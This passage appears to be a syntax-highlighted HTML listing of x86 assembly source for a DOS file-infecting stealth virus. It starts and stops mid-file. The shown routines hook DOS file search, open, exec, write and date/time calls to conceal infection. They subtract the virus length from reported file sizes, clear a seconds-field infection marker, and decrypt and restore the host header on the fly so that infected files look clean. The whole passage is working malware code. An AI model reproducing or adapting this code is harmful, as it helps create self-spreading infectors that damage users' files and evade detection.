</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">ff_fcb</span><span class="sc4">:</span><span class="sc0"> 
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
</span><span class="sc1">;Call DOS service</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc1">;Save all regs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
</span><span class="sc1">;Check for errors</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nofound_fcb</span><span class="sc0">
</span><span class="sc1">;Get current PSP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc1">;Check if call comes from DOS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nofound_fcb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;Get DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fcb_ok</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
</span><span class="sc5">fcb_ok</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Check if infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nofound_fcb</span><span class="sc0">
</span><span class="sc1">;Restore seconds</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">0E0h</span><span class="sc0">
</span><span class="sc1">;Restore original file size</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Dh</span><span class="sc4">],</span><span class="sc5">lenvir</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Fh</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">nofound_fcb</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Restore some registers and return</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Search stealth with functions 4Eh and 4Fh (handle)</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">ff_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
</span><span class="sc1">;Call DOS service</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ffhok</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">ffhok</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Save result</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
</span><span class="sc1">;Get DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc1">;Check if infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nofound_handle</span><span class="sc0">
</span><span class="sc1">;Restore seconds field</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc2">0E0h</span><span class="sc0">
</span><span class="sc1">;Restore original size</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc5">lenvir</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">nofound_handle</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Restore some registers and exit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">cmc</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Load exec</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">dos_load_exec</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Open file for read-only</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">loaded</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">
</span><span class="sc5">loaded</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">do_disinfect</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Write file</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">dos_write</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
</span><span class="sc5">do_disinfect</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Get sft address in es:di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">bad_operation</span><span class="sc0">
</span><span class="sc1">;Check if file is already infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">clear_header</span><span class="sc0">
</span><span class="sc5">bad_operation</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">load_error</span><span class="sc0">
</span><span class="sc5">clear_header</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Save and set file open mode (read/write)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc1">;Save and set file attribute</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;Save and set file pointer position</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Get file true size if write operation</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_function</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],(</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_size_fix</span><span class="sc0">
</span><span class="sc1">;Add virus size to file size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc5">lenvir</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">no_size_fix</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Point to old header in file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_end</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc2">0019h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc1">;Read old header and encryption key</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0019h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_copy</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_disin</span><span class="sc0">
</span><span class="sc1">;Decrypt header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0019h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">19h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">restore_header</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">restore_header</span><span class="sc0">
</span><span class="sc1">;Write old header</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_begin</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_copy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0019h</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc1">;Truncate file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_end</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc5">lenvir</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc5">exit_disin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Restore file pointer position</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Restore file attribute </span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc1">;Restore file open mode</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Do not set file date and file time on closing</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc1">;Clear seconds field</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">],</span><span class="sc2">0E0h</span><span class="sc0">
</span><span class="sc5">load_error</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Check if write function</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_function</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],(</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">not_load</span><span class="sc0">
</span><span class="sc1">;Close file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc5">not_load</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Get file date/time</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">dos_get_time</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
</span><span class="sc1">;Call function</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ok_get_time</span><span class="sc0">
</span><span class="sc1">;Exit if error</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">ok_get_time</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
</span><span class="sc1">;Check if file is already infected        </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_get_time</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">exit_get_time</span><span class="sc0">
</span><span class="sc5">no_get_time</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
</span><span class="sc5">exit_get_time</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">cmc</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Set file date/time</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">dos_set_time</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">        
</span><span class="sc1">;Get address of sft entry</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">        
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">no_set_time</span><span class="sc0">        
</span><span class="sc1">;Check if file is already infected        </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ok_set_time</span><span class="sc0">
</span><span class="sc5">no_set_time</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Exit if not infected or error</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">
</span><span class="sc5">ok_set_time</span><span class="sc4">:</span><span class="sc0">        
</span><span class="sc1">;Perform time change but restore our marker</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Open file</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">dos_open</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Call dos function</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">do_open</span><span class="sc0">
</span><span class="sc5">open_fail</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
